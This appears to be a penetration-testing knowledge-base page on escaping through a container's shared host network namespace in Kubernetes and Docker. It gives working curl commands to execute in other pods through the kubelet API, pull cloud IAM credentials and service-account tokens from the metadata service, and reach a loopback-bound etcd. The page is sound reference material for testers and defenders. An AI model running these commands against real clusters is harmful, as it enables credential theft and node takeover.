---
title: "Host network namespace: reaching node-local services and traffic"
order: 2
description: "A container sharing the host network namespace uses the host's interfaces, routing, and loopback. That exposes services bound to 127.0.0.1 on the node, such as the kubelet read-write API, the cloud metadata service, and local admin daemons, and allows sniffing and binding on host interfaces, turning network reach into credential theft and node compromise."
keywords:
  - hostnetwork
  - network namespace
  - kubelet api
  - metadata service
  - container escape
---

# Host network namespace

`--net=host` or `hostNetwork: true` places the container directly on the host's network stack: the same interfaces, routing table, and, critically, the same loopback. Services that bind to `127.0.0.1` assume only host-local callers can reach them, so sharing the namespace exposes those services to the container. On a cloud node or Kubernetes worker this is a direct path to the kubelet, the metadata service, and local management daemons.

Confirm and enumerate:

```bash
ip addr                                   # host interfaces (not a lone eth0/veth)
ss -tlnp 2>/dev/null                       # host-local listeners, including 127.0.0.1 ones
ip route                                   # host routing table
```

## Routes

```bash
# Kubelet read-write API on the node (often 10250): list pods, exec into them
curl -sk https://127.0.0.1:10250/pods | head
curl -sk -XPOST "https://127.0.0.1:10250/run/<ns>/<pod>/<container>" -d 'cmd=id'

# Cloud instance metadata: steal the node's role credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H 'Metadata-Flavor: Google' \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Local-only admin services assumed unreachable from workloads
curl -s http://127.0.0.1:2379/version      # etcd, if bound to loopback
```

The kubelet and metadata routes are the highest value: the kubelet API can exec into other pods on the node, and the metadata credentials are the node's cloud identity, frequently permitting broad account actions.

## Exploitation notes

- This is a reachability escape: it does not by itself run code on the host, but it unlocks services whose own weak authentication (an anonymous kubelet, an open etcd, a token-vending metadata endpoint) completes the compromise.
- Sharing the namespace also permits binding to host ports and sniffing host interfaces, enabling interception of node-local plaintext traffic.
- In Kubernetes, `hostNetwork` pods are a standard node-credential path; combine with the metadata and kubelet routes under [Pod escape to node](../../../orchestration/kubernetes/pod-escape-to-node/index.md).

## References

- [man 7 network_namespaces](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [Kubernetes: kubelet authn/authz](https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/)
- [HackTricks: network namespace](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/namespaces/network-namespace)
